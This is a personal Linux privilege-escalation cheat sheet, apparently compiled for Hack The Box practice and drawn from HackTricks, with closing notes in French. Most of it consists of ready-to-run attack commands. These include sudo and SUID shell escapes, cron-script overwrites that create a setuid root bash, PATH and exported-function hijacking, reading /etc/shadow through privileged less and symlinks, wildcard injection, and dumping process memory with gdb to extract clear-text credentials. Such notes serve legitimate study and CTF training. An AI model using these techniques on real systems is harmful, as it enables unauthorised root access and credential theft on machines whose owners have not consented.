# Privilege Escalation

## Disclaimer / Explanation

I know linpeas & linenum are good priv esc scripts, but as i'm new to that, all this information kinds of overwhelm me. I prefer to do it step by step myself.

So i'm going to describe what to check for step by step here. This is **heavily** taken from [hacktricks](https://book.hacktricks.xyz/) \(linpeas's author\), but i'm modifying some stuff and adding what I learned in hack the box.

It is still under development.

## Kernel exploits

* Check kernel version with `cat /proc/version` & `uname -a` to see if it's vulnerable
* He also gives some github with compiled exploit and tools that helps finding exploit, go check [https://book.hacktricks.xyz/linux-unix/privilege-escalation\#kernel-exploits](https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits)

## User

Get some basic info about users

```bash
id # Me & my groups
cat /etc/passwd | cut -d: -f1 # All users
cat /etc/passwd | grep "sh$" # Users with console
awk -F: '($3 == "0") {print}' /etc/passwd # Superusers
w # Currently login users
last | tail # Login history
```

### Big UID

Some Linux versions were affected by a bug that allow users with **UID &gt; INT\_MAX** to escalate privileges. More info: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74),  [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) and [here](https://twitter.com/paragonsec/status/1071152249529884674).  
**Exploit it** using: **`systemd-run -t /bin/bash`**

## Sudo

### Exploits

Based on the vulnerable versions given in searchsploit, we can check if sudo is vulnerable with :

```bash
sudo -V | grep "Sudo ver" | grep "1.6.8p9\|1.6.9p18\|1.8.14\|1.8.20\|1.6.9p21\|1.7.2p4\|1\.8\.[0123]$\|1\.3\.[^1]\|1\.4\.\d*\|1\.5\.\d*\|1\.6\.\d*\|1.5$\|1.6$"
```

### Rights

Check what you can run with `sudo -l`. Depending on the cmd and the options, you might be able to do shell escapes. Check [gtfobins](https://gtfobins.github.io/).

## SUID

See if you can hijack them in any way \(i'll give example later\)

```bash
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

## $PATH

If you can write in some folder of $PATH, you may priv esc by creating a backdoor with the name of the cmd called. If it's called without an absolute path, or if your folder is before it's original one in the $PATH, your exe is going to be used.

You can find called processes in cron or with _pspy_ for example.

## Services

Check if you can write to any `.services` files or overwrite binaries called by them. If so, you can use a backdoor whenever the service is started, restarted or stopped.

## Software exploit

```bash
dpkg -l #Debian
rpm -qa #Centos
```

If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

## Systemd

Check the systemd thingy

## Sockets

Check the socket thingy

## Processes

Take a look to what processes are being executed and check if any process has more privileges that it should \(maybe a tomcat being executed by root?\)

```bash
ps aux
ps -ef
top -n 1
```

### Process memory

Some services of a server save **credentials in clear text inside the memory**. If you have access to the memory of a FTP service \(for example\) you could get the Heap and search inside of it the credentials.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### /proc/$pid/maps &  /proc/$pid/mem

For a given process ID, **maps shows how memory is mapped within that processes'** virtual address space; it also shows the **permissions of each mapped region**. The **mem** psuedo file **exposes the processes memory itself**. From the **maps** file we know which **memory regions are readable** and their offsets. We use this information to **seek into the mem file and dump all readable regions** to a file.

To dump a process memory you could use:

* [https://github.com/hajzer/bash-memory-dump](https://github.com/hajzer/bash-memory-dump) \(root is required\)
* Script A.5 from [https://www.delaat.net/rp/2016-2017/p97/report.pdf](https://www.delaat.net/rp/2016-2017/p97/report.pdf) \(root is required\)

## Scheduled jobs

Check if any scheduled job has any type of vulnerability. Maybe you can take advantage of any script that root executes sometimes \(wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?\).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

### Example: Cron path

For example, inside _/etc/crontab_ you can find the sentence: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

If inside this crontab the root user tries to execute some command or script without setting the path. For example: _\* \* \* \* root overwrite.sh_

Then, you can get a root shell by using:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait 1 min
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Example: Cron using a script with a wildcard \(Wildcard Injection\)

If a script being executed by root has an “**\***” inside a command, you could exploit this to make unexpected things \(like privesc\). Example:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**The wildcard cannot be preceded of a path:** _**/some/path/\***_ **is not vulnerable \(even** _**./\***_ **is not\)**

\*\*\*\*[**Read this for more Wildcards spare tricks**]()

### Example: Cron script overwriting and symlink

If you can write inside a cron script executed by root, you can get a shell very easily:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

If the script executed by root uses somehow a directory in which you have full access, maybe it could be useful to delete that folder and create a symlink folder to another one

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Frequent cron jobs

You can monitor the processes to search for processes that are being executed every 1,2 or 5 minutes. Maybe you can take advantage of it and escalate privileges.

For example, to **monitor every 0.1s during 1 minute**, **sort by less executed commands** and deleting the commands that have beeing executed all the time, you can do:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

You could also use [pspy](https://github.com/DominicBreuker/pspy/releases) \(this will monitor every started process\).

## Commands with sudo and suid commands

You could be allowed to execute some command using sudo or they could have the suid bit. Check it using:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

Some **unexpected commands allows you to read and/or write files or even execute command.** For example:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

{% embed url="https://gtfobins.github.io/" %}

### Sudo execution bypassing paths

**Jump** to read other files or use **symlinks**. For example in sudeores file: _hacker10 ALL= \(root\) /bin/less /var/log/\*_

```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```

If a **wilcard** is used \(\*\), it is even easier:

```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```

**Countermeasures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

If the **sudo permission** is given to a single command **without specifying the path**: _hacker10 ALL= \(root\) less_ you can exploit it by changing the PATH variable

```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```

This technique can also be used if a **suid** binary **executes another command without specifying the path to it \(always check with** _**strings**_ **the content of a weird SUID binary\)**.

[Payload examples to execute.]()

### SUID binary with command path

If the **suid** binary **executes another command specifying the path**, then, you can try to **export a function** named as the command that the suid file is calling.

For example, if a suid binary calls _**/usr/sbin/service apache2 start**_ you have to try to create the function and export it:

```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```

Then, when you call the suid binary, this function will be executed

## Hack the box

J'utilise évidemment les scripts, mais je voulais noter ici les éléments spécifiques à chercher pour résoudre certaines boxes.

* Fichiers `.bak` sensible ?
* **Ports** ouverts sur localhost ? \(Port forward si besoin\)
* Un job **cron** lancé par un utilisateur aura ces droits, donc si on arrive à faire en sorte que ce qu'il appelle lance un shell, on en aura un avec des droits
* Obtenir la liste de tout les fichiers own par root mais n'appartenant pas au groupe de root \(script custom\) : `find / -user root ! -group root -ls 2> /dev/null`
  * Si on arrive à devenir un des membres d'un de ces groupes et si un de ces fichiers nous permet de lancer une commande, celle-ci sera lancée en tant que root 
* Si on y a accès, check `.bash_history` pour voir s'il ne leak pas des mdp ou des fichiers intéressants
* Si on arrive sur un **serveur web,** chercher le fichier de config de la db et tenter de se co pour ensuite explorer les tables d'utilisateurs & co
* Si un script change les droits d'un fichier, si on fait un **lien symbolique** entre ce nom de fichier et un fichier qui nous intéresse, cela changera aussi les droits du fichier qui nous intéresse.

## Sources

* [Hack The Box](https://www.hackthebox.eu/)'s Exercices
* [Ippsec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA)'s videos
* [Hacktricks](https://book.hacktricks.xyz/)

